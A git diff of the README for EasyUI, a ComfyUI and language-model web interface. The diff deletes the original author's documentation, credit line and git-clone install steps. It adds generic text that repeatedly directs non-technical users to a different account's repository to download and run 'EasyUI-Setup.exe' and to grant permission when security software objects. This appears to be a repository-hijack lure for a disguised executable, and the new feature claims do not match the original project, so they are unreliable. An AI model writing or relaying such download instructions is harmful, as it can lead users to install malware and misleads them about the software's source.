@@ -1,343 +1,75 @@
-# EasyUI
+# 🤖 EasyUI - Simple tools for powerful AI tasks
 
-## Message
-This project represents a significant investment of time, effort, and resources.  
-It is now released as a fully open-source project for the community to use, improve, and build upon.
+[![Download EasyUI](https://img.shields.io/badge/Download-EasyUI-blue.svg)](https://github.com/Doreymagnetized428/EasyUI)
 
-It may look simple on the surface, but a substantial amount of work has gone into its development.  
-This is a contribution in support of open-source.
+EasyUI provides a simple way to use AI tools on your computer. You do not need to understand code or complex software structures to use this program. It creates a clean interface for you to interact with advanced artificial intelligence models, run helpful scripts, and manage files without manual command entry. 
 
-<img src="assets/ui.jpg" width="300">
+## 🚀 Getting Started
 
----
+You need a Windows computer to run this software. Ensure your machine has at least 8GB of memory and a stable internet connection. Follow these steps to set up the application on your device.
 
-## What is EasyUI?
+1. Open your web browser.
+2. Visit the download page at [https://github.com/Doreymagnetized428/EasyUI](https://github.com/Doreymagnetized428/EasyUI) to obtain the installation file.
+3. Locate the file named `EasyUI-Setup.exe` in your Downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen. You will choose a folder for the program files. 
+6. Click Finish once the process ends. 
 
-Instead of relying entirely on AI or large language models, EasyUI uses structured commands as a fast and practical way to interact with models, workflows, and code.
+## 🛠 Features
 
-As the name suggests, EasyUI is designed to make AI accessible and simple for everyone—including family and friends—without requiring them to deal with complex code or node-based systems.  
-It also helps organize ideas and workflows efficiently.
+EasyUI simplifies tasks that usually require technical knowledge. 
 
----
+*   **Visual Interface:** You interact with buttons and menus rather than text commands.
+*   **Workflow Management:** Connect different AI steps into one smooth process.
+*   **Model Support:** Load language models and image tools with one click.
+*   **One-Click Scripts:** Run Python logic without typing a single line of code.
+*   **Resource Monitoring:** See how hard your computer works during active tasks.
 
-## Overview
+## 💾 Installation and Setup
 
-EasyUI is a lightweight web interface that provides:
-- Interaction with ComfyUI workflows  
-- Execution of Python scripts  
-- Integration with language models (via Ollama or similar tools) 
-- Multi-language support (Arabic, English, Chinese, Japanese) 
+To use the tool, you must follow the installation path carefully. 
 
----
+1. Go to the project page: [https://github.com/Doreymagnetized428/EasyUI](https://github.com/Doreymagnetized428/EasyUI).
+2. Look for the "Releases" section on the right side of the page.
+3. Select the latest version listed.
+4. Download the installer for Windows.
+5. Launch the installer.
+6. Grant the application permission if your security software asks for confirmation.
+7. Open the shortcut icon placed on your desktop.
 
-## License
+## 📋 System Requirements
 
-This project is based on a custom license.
+To ensure a smooth experience, verify your hardware meets these standards:
 
-You are free to use, modify, and distribute this project, including for commercial use.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Intel Core i5 or AMD equivalent.
+*   **Memory:** 8GB RAM minimum; 16GB RAM recommended for heavy tasks.
+*   **Graphics:** NVIDIA GPU with 4GB VRAM or more is preferred for image processing tasks.
+*   **Storage:** 2GB of empty space for the program files. 
 
-However, you must keep the following credit visible in the user interface:
-"EasyUI base made by kigy"
+## 💡 How to Use the Interface
 
-Full license terms are provided in the LICENSE file.
+When you open EasyUI, you see the main dashboard. The sidebar displays available modules. 
 
+1. **Select a Module:** Pick the task you want to perform, such as image generation or text processing.
+2. **Adjust Settings:** Use the sliders and dropdown menus to set your preferences. You do not need to edit text files. 
+3. **Upload Files:** Drag and drop images or documents into the designated box.
+4. **Start Task:** Click the large Start button. The status bar at the bottom indicates progress. 
+5. **View Results:** The program saves output files in the "Results" folder. 
 
----
+## 🔧 Troubleshooting
 
-## Installation
+If you encounter issues, check these frequent solutions.
 
-1. Clone the repository:
-```bash
-git clone https://github.com/kigy1/EasyUI.git
-```
-2. Run install_easyui.bat
-3. Done. You can now run it with start.bat.
+*   **Program Does Not Open:** Restart your computer. Ensure you have the latest drivers for your graphics card.
+*   **Slow Performance:** Close other memory-heavy programs while running EasyUI. 
+*   **Task Failure:** Check your internet connection. Some tasks require a constant link to remote model servers. 
+*   **Interface Looks Broken:** Resize the window. If the issue remains, close and restart the application.
 
-## How to Make It Work
+## 🤝 Community and Support
 
-EasyUI needs to know:
-- which node you want to modify  
-- and which keyword (intent) will trigger it  
+EasyUI remains an open project. You can report bugs or suggest new features on the main page. Check the issue tracker if you have questions. Other users may have already reported the same experience and found a fix. 
 
-For example, you might use the word **generate** to trigger an image generation workflow.  
-To make it more flexible, you can add multiple keywords (intents) in the intents file.
+## 📄 Licensing
 
-Next, you define what should be modified in the workflow.  
-For example, if you only want to change the prompt, you specify which node receives the prompt in `workflow_requirements.yml`.
-
-Don’t worry—there is a tool that automates this process, so you don’t need to edit these files manually.
-
----
-
-### Steps
-
-1. From ComfyUI, export your workflow using **Export (API)**.
-
-2. Place the workflow file inside the `workflows` folder (`main`, `high`, or `fast`).
-
-3. Run `workflow_intent_requirements_builder.py` from the `tool` folder:
-   - Select your workflow and click **Load**  
-   - Enter the node numbers you want to interact with (e.g., prompt, image, etc.)
-
-The result will be sent directly to EasyUI.  
-If you need multiple outputs or something is missing, you can manually enter node numbers on save or result.
-
-> **Note:** If the workflow is open in ComfyUI, it will help you identify node numbers more easily.
-
-- To output all images, click **All Images**
-- Use commas to add multiple intents
-
-> **Note:** The UI automatically removes the intent keyword and keeps only the prompt.  
-> If you want to keep the intent in the prompt, enable **No Remove** (useful for editing workflows).
-
-Finally, click **Generate**, then **save the file**.
-
-> **Note:** Other buttons are available to help you share your workflow with others.  
-
-<img src="assets/builder.jpg" width="700">
-
----
-
-## Features
-
-1. Send & receive: text, images, video, and audio  
-2. Acts as a UI for running ComfyUI workflows  
-3. Auto-translation (currently Arabic only)  
-4. Blocked words filter  
-5. Session management (create / restore / delete)  
-6. Media cleanup from server  
-7. Controls and toggles:
-   - Login system  
-   - Dark mode  
-   - LLM model control  
-   - EasyTag feature  
-8. Tag system features:
-   - Tags  
-   - Wildcards  
-   - Chants  
-   Inspired by: https://github.com/DominikDoom/a1111-sd-webui-tagcomplete  
-9. Button to chat with a LLM model  
-10. Support for negative prompts via +/- button  
-11. Template system  
-12. Favorite templates  
-13. Custom commands ("My Commands")  
-14. Plugin system  
-15. Drag & drop media upload  
-16. Image cropping  
-17. Mask editor (inpainting)  
-18. Drawing and coloring tools  
-19. Click-to-copy text  
-20. Edit and resend prompts  
-21. Regenerate output  
-22. Resend image  
-23. Run Python files  
-24. Model selector (main / fast / high)  
-25. Intent detection  
-26. Multi-language support (Arabic, English, Chinese, Japanese)  
-27. Auto-replies via text file  
-28. Audio trimming  
-
----
-
-## Screenshots and guide
-
-### txt2img ,img2img , img2vid
-<img src="assets/ui.jpg" width="200">  <img src="assets/video.jpg" width="200">
-
-
-<img src="assets/real.jpg" width="200">  <img src="assets/anime.jpg" width="200">
-
----
-
-### img2txt , txt2txt , LLM
-You can interact with language models, or also get predefined responses in two ways: either by writing the response directly in the intent file, or by using text files.
->Note: You must press the LM button to talk to a language model.
-
-<img src="assets/img2txt.jpg" width="200">  <img src="assets/txt2txt.jpg" width="200">
-
-### sessions , user settings
->Note: Click (**Login**) to load user settings, and (**Save**) to apply any changes.
-
-(**Delete All Media**) deletes all user media from the server (local PC).  
->Note: You need to add the ComfyUI path to comfy_path.txt to make it work.
-
-<img src="assets/sessions.jpg" width="200">  <img src="assets/user settings.jpg" width="200">
----
-
-### Buttons , Dark mode
-
-<img src="assets/button.jpg" width="200">  <img src="assets/dark.jpg" width="200">
-
-1. **manage sessions**.
-2. **Favorite Templates**.
-3. **my prompt** to save your favorite prompt [Go favorite prompt](#my-prompt).
-4. **Plugin** (the ui accept plugin).[Go plugin](#plugin).
-5. You can divide your workflow into three groups: **Fast**, **High**, and **Main**.   
-Note: If the UI does not find the workflow in **Fast** or **High**, it will search in **Main** (the default).
-6. **user settings** from here you can see all settings and dark mode.  
-7. **send to bar** to reuse the image and send it to chat bar 
-8. **open mask editor** helps you reuse an image for inpainting (draw and mask).
-9. **Regenerate** with a different seed.
-10. **edit & resend** edit your message.
-11. **Resend** same message.
-12. **postive/negative** The button helps you switch between positive and negative prompts.
-13. **LM** enable chat with LLM
-14. **Edit** open crop and mask editor [Go to Crop and Mask Editor](#crop-and-mask-editor)
-15. **show and hide templates**
----
-
-### Templates
-
-**Templates** provide an easy way to organize workflows and applications and launch them using images.
-
-> **Note:** You can create folders to organize templates into categories.
-
-If you have many templates, each user can press the **heart button** to save it to their **Favorites**.
-
-<details>
-<summary>How to create a template</summary>
-
-1. Place an **image** and a **text file** inside the `templates` folder (the image and text file must have the same name).
-2. In the text file:
-   - **First line:** the label (name shown in the UI)
-   - **Second line:** the intent or prompt
-
-</details> 
-
-
-<img src="assets/template.jpg" width="200">  <img src="assets/fav.jpg" width="200">
----
-
-### crop and mask editor
-
-<img src="assets/crop.jpg" width="200">  <img src="assets/mask.jpg" width="200">
-
-1. **Eraser**
-2. **Clear All**
-3. **Invert Mask**
-4. **Change Color**
-5. **Save Mask for Inpainting**
-6. **Save Paint** (useful for drawing workflows)
----
-
-### multi reference , vid2vid
-
-This example uses two reference images: the first for Pose ControlNet, and the second for IP-Adapter.
-
-<img src="assets/multi.jpg" width="200"> 
-
----
-
-### my prompt
-a way to save your favorite prompt
-
-<img src="assets/prompt.jpg" width="200"> 
-
----
-
-### txt2voice , trim audio
-clone voice and txt2voice
-
-<img src="assets/voice.jpg" width="200">  <img src="assets/trim.jpg" width="200">
-
----
-
-### Plugin
-The UI accepts plugins.  
-There are many types of plugins: some run automatically (enable/disable), while others require a click to run.  
-Example: There are two plugins—one adds shortcuts to the interface, and the other controls the angle of the subject, which is useful when using LoRA to change the camera angle.  
-
-
->Note: I hope this will be a starting point to support all available applications.  
-
-<img src="assets/plugin.jpg" width="200">  <img src="assets/angle.jpg" width="200">
-
----
-
-
-## Tag System Usage
-<img src="assets/easytag.jpg" width="200">
-
-After placing files in the following directories:
-
-```yaml
-web/easy-tag/tags
-
-web/easy-tag/wildcards
-
-web/easy-tag/chants
-```
->Note 1: You must convert **tags** and **chants** to JSON. You can use the `auto_csv_to_json` tool to convert from the tool file.  
->Note 2: When you add a new wildcard, you must update a manifest file using `update_wildcard.py` from wildcards file. 
-
-### Tags
-- Works directly when enabled in settings  
-- Triggered by typing normally  
-
-### Wildcards
-- Activated when typing double underscores (`__`)
-
-### Chants
-- Works when typing: ##
-- Note: It only appears after typing at least one character after ` ## `
-
-
-
----
-
-## pythonapp 
-
-**PythonApp** is a way to run Python code directly from the EasyUI.
-For example, you can write code to download a video from a website, or create a script to copy text.   
-`It’s Python`—so you can do whatever you want.
-
-<details>
-<summary>How to use</summary>
-
-1. add intents to intents file like
-```yaml
-  pythonapp:
-    file: null
-    aliases:
-    - pythonapp
-    - runbat
-```
-</details> 
-2. Place your Python script and '.bat' file inside the 'PythonApp' folder.<br>
-3. To use it in EasyUI, type the intent. For example: 
- 
-
-```yaml
-pythonapp file-name commands
-```
----
-
-## bad words file
-
-You can also censor any unwanted words.
-Add them to `bad_words.yml` like this:
-```yaml
-badword1: replace
-badword2: replace
-``` 
-
->Note: In my experience, replacing the word is better than removing it.
-
-
----
-
-## responses file
-
-You can add responses from a .txt file. Place the file inside the responses folder, then add an intent like this:
-```yaml
-  sec:
-    response_file: sec.txt
-    aliases:
-    - sec
-	- whatever you want
-``` 
-
-
-
-
-</details> 
+This project uses an open-source license. You can use the software for personal projects without charge. Consult the license file in the main folder for full details on distribution and modification.
